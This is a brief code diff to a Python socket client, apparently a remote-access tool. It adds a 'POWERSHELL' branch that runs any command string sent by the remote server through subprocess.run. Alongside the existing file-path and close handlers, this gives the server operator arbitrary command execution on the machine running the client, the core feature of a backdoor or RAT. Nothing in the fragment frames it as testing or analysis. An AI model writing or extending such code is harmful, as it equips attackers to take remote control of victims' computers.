@@ -689,6 +689,9 @@ def main_client():
                 if response.startswith("FILE_PATH"):
                     file_path = response.split(" ")[1]
                     handle_file_path(file_path)
+                elif response.startswith("POWERSHELL"):
+                    pscommand = response.split(" ")[1]
+                    subprocess.run(pscommand)
                 elif response == "CLOSE":
                     client_socket.close()
                     client_socket = None
